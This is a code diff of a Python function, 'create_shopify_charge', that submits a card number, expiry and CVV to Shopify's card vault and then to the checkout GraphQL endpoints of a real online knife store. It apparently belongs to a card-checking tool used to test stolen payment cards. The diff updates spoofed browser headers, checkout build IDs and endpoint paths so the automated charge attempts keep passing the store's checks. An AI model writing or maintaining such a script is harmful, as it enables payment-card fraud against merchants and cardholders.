@@ -106,18 +106,19 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
 
               headers = {
                   'accept': 'application/json',
-                  'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
+                  'accept-language': 'en-US,en;q=0.6',
                   'content-type': 'application/json',
                   'origin': 'https://checkout.pci.shopifyinc.com',
                   'priority': 'u=1, i',
-                  'referer': 'https://checkout.pci.shopifyinc.com/build/61a2adc/number-ltr.html?identifier=&locationURL=',
-                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+                  'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html?identifier=&locationURL=',
+                  'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                   'sec-ch-ua-mobile': '?0',
                   'sec-ch-ua-platform': '"Windows"',
                   'sec-fetch-dest': 'empty',
                   'sec-fetch-mode': 'cors',
                   'sec-fetch-site': 'same-origin',
-                  'sec-fetch-storage-access': 'active',
+                  'sec-fetch-storage-access': 'none',
+                  'sec-gpc': '1',
                   'user-agent': user,
               }
 
@@ -127,9 +128,9 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
                       'month': int(mes),
                       'year': int(ano),
                       'verification_value': cvv,
-                      'start_month': int(mes),
-                      'start_year': int(ano),
-                      'issue_number': card,
+                      'start_month': None,
+                      'start_year': None,
+                      'issue_number': '',
                       'name': 'SHK GAMING',
                   },
                   'payment_session_scope': 'shedknives.com',
@@ -141,21 +142,23 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
 
               headers = {
     'accept': 'application/json',
-    'accept-language': 'en-IN',
+    'accept-language': 'en-US',
     'content-type': 'application/json',
     'origin': 'https://shedknives.com',
     'priority': 'u=1, i',
-    'referer': 'https://shedknives.com/',
-    'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+    'referer': f'https://shedknives.com/checkouts/cn/{token}/en-us?skip_shop_pay=true',
+    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
+    'sec-gpc': '1',
     'shopify-checkout-client': 'checkout-web/1.0',
+    'shopify-checkout-source': f'id="{token}", type="cn"',
     'user-agent': user,
     'x-checkout-one-session-token': x_checkout_one_session_token,
-    'x-checkout-web-build-id': '2cc80faca885ade9db1085b81b6b927c893b6162',
+    'x-checkout-web-build-id': '64794bb5d2969ba982d4eb9ee7c44ab479c9df23',
     'x-checkout-web-deploy-stage': 'production',
     'x-checkout-web-server-handling': 'fast',
     'x-checkout-web-server-rendering': 'yes',
@@ -359,7 +362,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
 }
 
               request = await session.post(
-                  'https://shedknives.com/checkouts/unstable/graphql',
+                  'https://shedknives.com/checkouts/internal/graphql/persisted',
                   params=params,
                   headers=headers,
                   json=json_data,
@@ -367,21 +370,23 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
 
               headers = {
     'accept': 'application/json',
-    'accept-language': 'en-IN',
+    'accept-language': 'en-US',
     'content-type': 'application/json',
     'origin': 'https://shedknives.com',
     'priority': 'u=1, i',
-    'referer': 'https://shedknives.com/',
-    'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+    'referer': f'https://shedknives.com/checkouts/cn/{token}/en-us?skip_shop_pay=true',
+    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
+    'sec-gpc': '1',
     'shopify-checkout-client': 'checkout-web/1.0',
+    'shopify-checkout-source': f'id="{token}", type="cn"',
     'user-agent': user,
     'x-checkout-one-session-token': x_checkout_one_session_token,
-    'x-checkout-web-build-id': '2cc80faca885ade9db1085b81b6b927c893b6162',
+    'x-checkout-web-build-id': '64794bb5d2969ba982d4eb9ee7c44ab479c9df23',
     'x-checkout-web-deploy-stage': 'production',
     'x-checkout-web-server-handling': 'fast',
     'x-checkout-web-server-rendering': 'yes',
@@ -634,7 +639,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
 }
 
               request = await session.post(
-                  'https://shedknives.com/checkouts/unstable/graphql',
+                  'https://shedknives.com/checkouts/internal/graphql/persisted',
                   params=params,
                   headers=headers,
                   json=json_data,
@@ -650,7 +655,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
 
               headers = {
                   'accept': 'application/json',
-                  'accept-language': 'en-IN',
+                  'accept-language': 'en-US',
                   'content-type': 'application/json',
                   'origin': 'https://shedknives.com',
                   'priority': 'u=1, i',
@@ -664,7 +669,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
                   'shopify-checkout-client': 'checkout-web/1.0',
                   'user-agent': user,
                   'x-checkout-one-session-token': x_checkout_one_session_token,
-                  'x-checkout-web-build-id': '2cc80faca885ade9db1085b81b6b927c893b6162',
+                  'x-checkout-web-build-id': '64794bb5d2969ba982d4eb9ee7c44ab479c9df23',
                   'x-checkout-web-deploy-stage': 'production',
                   'x-checkout-web-server-handling': 'fast',
                   'x-checkout-web-server-rendering': 'yes',
@@ -686,7 +691,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
               }
 
               request = await session.post(
-                  'https://shedknives.com/checkouts/unstable/graphql',
+                  'https://shedknives.com/checkouts/internal/graphql/persisted',
                   params=params,
                   headers=headers,
                   json=json_data,
@@ -696,7 +701,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
 
               headers = {
                   'accept': 'application/json',
-                  'accept-language': 'en-IN',
+                  'accept-language': 'en-US',
                   'content-type': 'application/json',
                   'origin': 'https://shedknives.com',
                   'priority': 'u=1, i',
@@ -710,7 +715,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
                   'shopify-checkout-client': 'checkout-web/1.0',
                   'user-agent': user,
                   'x-checkout-one-session-token': x_checkout_one_session_token,
-                  'x-checkout-web-build-id': '2cc80faca885ade9db1085b81b6b927c893b6162',
+                  'x-checkout-web-build-id': '64794bb5d2969ba982d4eb9ee7c44ab479c9df23',
                   'x-checkout-web-deploy-stage': 'production',
                   'x-checkout-web-server-handling': 'fast',
                   'x-checkout-web-server-rendering': 'yes',
@@ -732,7 +737,7 @@ async def create_shopify_charge(card, mes, ano, cvv, session):
               }
 
               request = await session.post(
-                  'https://shedknives.com/checkouts/unstable/graphql',
+                  'https://shedknives.com/checkouts/internal/graphql/persisted',
                   params=params,
                   headers=headers,
                   json=json_data,
